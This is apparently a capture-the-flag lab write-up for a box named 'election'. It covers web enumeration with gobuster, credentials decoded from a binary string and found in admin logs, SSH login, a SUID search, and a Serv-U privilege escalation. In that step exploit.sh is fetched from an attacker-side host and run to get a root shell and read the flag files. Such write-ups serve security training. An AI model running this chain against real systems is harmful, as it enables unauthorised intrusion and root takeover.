`Running all scans on 192.168.204.211`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

Nothing interesting on port 80
![[Pasted image 20240224122816.png]]

Gobuster to see what we find
`└─$ gobuster dir -u http://192.168.204.211/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt -t 50 -b '403,404' -r`

-r is to follow redirects
-b is to not show response code 404 or 403
-t is to up the threads to 50 to make it faster
-x is to add file extensions onto the word list line items

```
└─$ gobuster dir -u http://192.168.204.211/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt -t 50 -b '403,404' -r 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.204.211/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 10918]
/phpmyadmin           (Status: 200) [Size: 10531]
/robots.txt           (Status: 200) [Size: 30]
/phpinfo.php          (Status: 200) [Size: 95452]
/election             (Status: 200) [Size: 7003]
Progress: 189267 / 189270 (100.00%)
===============================================================
Finished
===============================================================
```

We find the robots.txt, phpinfo.php and 2 directories

Rerun it again to see what's in the election directory
```
└─$ gobuster dir -u http://192.168.204.211/election -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt -t 50 -b '403,404' -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.204.211/election
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7003]
/admin                (Status: 200) [Size: 8964]
/themes               (Status: 200) [Size: 965]
/js                   (Status: 200) [Size: 990]
/media                (Status: 200) [Size: 1755]
/data                 (Status: 200) [Size: 767]
/lib                  (Status: 200) [Size: 968]
/languages            (Status: 200) [Size: 1366]
/.                    (Status: 200) [Size: 7003]
/card.php             (Status: 200) [Size: 1935]
```

Checking card.php
![[Pasted image 20240224123516.png]]

What is this binary
If we convert this (twice) at https://www.rapidtables.com/convert/number/binary-to-ascii.html we get
user:1234
pass:Zxc123!@#

Using this we can login to the admin page at /election/admin/
![[Pasted image 20240224123704.png]]

Under settings we can view the logs
![[Pasted image 20240224123818.png]]

It gives us
`[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123`
`[2020-04-03 00:13:53] Love added candidate 'Love'.`
`[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).`
`[2024-02-24 22:13:51] Love has been logged in from Unknown IP on Chrome (Linux).`

We can ssh with these credentials `love:P@$$w0rd@123`

Search for suid permissions
`find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|&/sys\|^/snap'`

`love@election:~$ find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|&/sys\|^/snap'`
`/usr/bin/arping`
`/usr/bin/passwd`
`/usr/bin/pkexec`
`/usr/bin/traceroute6.iputils`
`/usr/bin/newgrp`
`/usr/bin/chsh`
`/usr/bin/chfn`
`/usr/bin/gpasswd`
`/usr/bin/sudo`
`/usr/sbin/pppd`
`/usr/local/Serv-U/Serv-U`
`/usr/lib/policykit-1/polkit-agent-helper-1`
`/usr/lib/eject/dmcrypt-get-device`
`/usr/lib/openssh/ssh-keysign`
`/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
`/usr/lib/xorg/Xorg.wrap`
`/bin/fusermount`
`/bin/ping`
`/bin/umount`
`/bin/mount`
`/bin/su`
`/home/love`

Serv-U looks a little out of place
Google this and see if we can use it
![[Pasted image 20240224124126.png]]

We save this and upload it to your target, launching it gives us root
`--2024-02-24 23:12:16--  http://192.168.45.222/exploit.sh`
`Connecting to 192.168.45.222:80... connected.`
`HTTP request sent, awaiting response... 200 OK`
`Length: 1178 (1.2K) [text/x-sh]`
`Saving to: ‘exploit.sh’`

`exploit.sh                    100%[================================================>]   1.15K  --.-KB/s    in 0s`      

`2024-02-24 23:12:16 (188 MB/s) - ‘exploit.sh’ saved [1178/1178]`

`love@election:/tmp$ chmod +x exploit.sh`
`love@election:/tmp$ ./exploit.sh`
`[*] Launching Serv-U ...`
`cp: cannot create regular file '/tmp/sh': Text file busy`
`sh: 1: : Permission denied`
`[+] Success:`
`-rwsr-xr-x 1 root root 1113504 Feb 24 22:25 /tmp/sh`
`[*] Launching root shell: /tmp/sh`
`sh-4.4# whoami`
`root`
`sh-4.4# cat /root/proof.txt`
`e99b7029616964ab3808f5e6f6b3b783`
`sh-4.4# cat /home/love/local.txt`
`9e998024aa75f1034f1c0d5a4b1b3d80`

